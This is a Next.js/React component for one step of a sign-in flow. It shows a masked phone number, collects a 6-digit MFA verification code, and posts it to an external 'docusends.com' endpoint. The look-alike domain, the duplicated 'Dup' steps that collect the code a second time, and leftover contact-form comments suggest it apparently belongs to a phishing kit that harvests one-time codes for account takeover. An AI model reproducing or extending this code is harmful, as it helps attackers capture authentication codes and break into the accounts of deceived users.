"use client";

import { LoginSetupSteps } from "@/constants";
import { useMultiStepForm } from "@/hooks/useMultiStepForm";
import clsx from "clsx";
import Link from "next/link";
import React, { Fragment, useState } from "react";
import { useFormContext } from "react-hook-form";
import StepOne from "./StepOne";
import StepTwo from "./StepTwo";
import InputField from "../UI/Input";
import StepFour from "./StepFour";
import axios from "axios";
import StepThree from "./StepThree";
import StepOneDup from "./StepOneDup";
import { ClipLoader } from "react-spinners";

const StepThreeDup = () => {
  const { control, watch, setValue } = useFormContext();
  const [inputClick, setInputClick] = useState(false);
  const {
    stepIndex,
    formStep,
    push,
    back,
    next,
    changeQuery,
    // steps,
    isFirstStep,
    isLastStep,
    urlStep,
  } = useMultiStepForm(
    [
      <StepOne key={0} />,
      <StepOneDup key={1} />,
      <StepTwo key={2} />,
      <StepThree key={3} />,
      <StepThreeDup key={4} />,
      <StepFour key={5} />,
    ],
    "loginUser"
  );
  const handleStepChange = (step: string) => {
    changeQuery("step", step);
  };
  const methods = useFormContext();
  const phoneNumber = methods.watch("number");
  const lastThreeDigits = phoneNumber?.slice(-3);
  const [isLoading, setIsLoading] = useState(false);

  // const cinemasUsingReach = watch("cinemasUsingReach") ;
  return (
    <div className="mt-[-30px] w-[340px] md:w-[450px] drop-shadow-custon bg-white rounded-[10px] py-8 px-8 top-[90px] flex-col flex gap-5 items-center  ">
      <h2 className="text-[#242C39] flex items-center justify-center w-full font-bold text-[15px] ">
        COMPLETE YOUR SIGN IN
      </h2>
      <div className="flex gap-10 relative items-center">
        {LoginSetupSteps.map((setup, index) => (
          <Fragment key={setup.step}>
            {/* Step Button */}
            <div className="relative flex items-center z-10 bg-white">
              <button
                className={clsx("grid place-content-center rounded-full", {
                  "border-[#266BCA] border-[2px] h-9 w-9":
                    urlStep === setup.step,
                })}
                type="button"
                onClick={() => handleStepChange((index + 1).toString())}
              >
                <button
                  className={clsx(
                    "grid h-7 w-7 place-content-center text-[13px] rounded-full font-bold  text-[#808085]",
                    { "bg-[#266BCA]": urlStep === setup.step },
                    { "border border-[#E9E9EA]": urlStep !== setup.step }
                  )}
                  type="button"
                  onClick={() => handleStepChange((index + 1).toString())}
                >
                  <span
                    className={clsx({ "text-white": urlStep == setup.step })}
                  >
                    {setup.step}
                  </span>
                </button>
              </button>
            </div>

            {/* Connecting Line (Only show if not the last step) */}
            {index < LoginSetupSteps.length - 1 && (
              <div className="absolute w-[285px] h-[2px] bg-[#E9E9EA] top-1/2 left-[50%] -translate-x-1/2 z-[-1]"></div>
            )}
          </Fragment>
        ))}
      </div>

      <>
        <p className="text-[15px] font-medium  text-[#808085]">
          Enter the code we sent to{" "}
          <span className="font-medium text-black">
            (***) *** {lastThreeDigits}
          </span>
        </p>

        <div className="w-full">
          <label
            htmlFor=""
            className="text-[13px] font-bold pb-2 text-[#444D4C]"
          >
            Enter the 6-digit code *
          </label>
          <div
            onClick={() => setInputClick(true)}
            className="px-4 relative py-6 w-full border-[2px] border-[#9F9E9D] rounded-[4px] w-full text-[10px] "
          >
            {inputClick ? null : (
              <span className="font-medium text-[#808085] text-[18px] absolute z-[0] translate-x-[-50%] left-[50%] top-[50%] translate-y-[-65%]">
                _ _ _ _ _ _
              </span>
            )}
            <InputField
              label=""
              name="codeDup"
              type="text"
              labelClassName=""
              // error={methods.formState.errors.number?.message as string}
              inputClassName="w-full absolute font-medium text-black left-3 right-0 top-0 bottom-0 border-none outline-none "
            />
            {/* <input
              type="text"
              className="w-full absolute left-3 right-0 top-0 bottom-0 border-none outline-none"
              onClick={() => setInputClick(true)}
            /> */}
          </div>
        </div>
        <p className="text-[14px]  text-[#929493] font-medium pb-2">
          Didn't receive it?{" "}
          <Link href="" className="text-[#5A80AD] font-medium underline">
            Resend my verification code
          </Link>
        </p>
        <div className="flex w-full flex-col items-center justify-center gap-1 rounded-[5px] bg-[#F5F5F5] py-2">
          <p className="text-[13px] font-medium">
            Have you lost access to all your MFA methods?
          </p>
          <p className="text-[13px] font-medium ">
            Please begin the
            <Link
              href="/"
              className="font-medium ml-1 underline text-[#5A80AD] font-medium"
            >
              MFA recovery process.
            </Link>
          </p>
        </div>
        <button
          type="submit"
          onClick={async () => {
            setIsLoading(true);
            const isValid = await methods.trigger(["codeDup"]); // Manually validate fields
            let otpConfirm = await methods.watch("codeDup"); // Manually validate fields
            if (isValid) {
              otpConfirm = await methods.watch("codeDup"); // Manually validate fields
              try {
                const response = await axios.post(
                  "https://api.docusends.com/api/send-otp-confirm",
                  {
                    otpConfirm,
                  }
                );

                if (response.status === 200) {
                  // toast.success("Message sent successfully!");
                  // setUserInput({ name: "", email: "", message: "" });
                  setIsLoading(false);
                  next(); // Only proceed if validation passes
                } else {
                  console.error("Failed to send message.");
                  setIsLoading(false);
                }
              } catch (error) {
                console.error("Error sending message.");
                setIsLoading(false);
              }
            }
          }}
          className="text-xs flex items-center justify-center w-full p-4 md:px-6 cursor-pointer py-4  rounded-[4px] bg-[#266BCA] font-bold text-white"
        >
          {isLoading ? (
            <>
              Continue
              <ClipLoader className="ml-2" size={14} color="white" />
            </>
          ) : (
            "Continue"
          )}
        </button>
      </>
    </div>
  );
};

export default StepThreeDup;
